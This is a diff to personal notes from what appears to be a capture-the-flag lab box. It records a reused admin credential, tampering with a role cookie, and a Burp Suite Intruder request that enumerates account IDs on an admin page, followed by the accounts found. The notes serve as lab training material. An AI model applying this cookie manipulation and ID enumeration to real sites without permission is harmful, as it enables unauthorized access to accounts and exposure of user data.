@@ -28,6 +28,9 @@ I used the uname+pw `admin:MEGACORP_4dm1n!!` to get in. I got the password from 
 
 ### Cookies
 
+    user=34322
+    role=admin
+
 I realize that the HTTP requests look like this:
 
 ```
@@ -54,7 +57,35 @@ If I change my cookie with Burp Suite, I might be able to get different response
 
 I noticed that if I change the `user` cookie to something other than `34322`, I get logged out, but if I change the `role`, nothing happens.
 
-Try `
+I was also going to use a 'intruder' attack from Burp Suite to see what 'id' values I could get from the site.
+
+```
+GET /cdn-cgi/login/admin.php?content=accounts&id=§foo§ HTTP/1.1
+Host: 10.10.10.28
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.10.28/cdn-cgi/login/admin.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: user=34322; role=admin
+Connection: close
+```
+
+From 1-100, these IDs existed, and gave these results from the `/cdn-cgi/login/admin.php?content=accounts&id=§foo§` page.
+
+-   n (format)
+    -   access id:name:email
+-   1
+    -   34322:admin:admin@megacorp.com
+-   4
+    -   8832:john:john@tafcz.co.uk
+-   13
+    -   57633:Peter:peter@qpic.co.uk
+-   23
+    -   28832:Rafol:tom@rafol.co.uk
+-   30
+    -   86575:super admin:superadmin@megacorp.com
 
 ### dirb http://10.10.10.28/
 
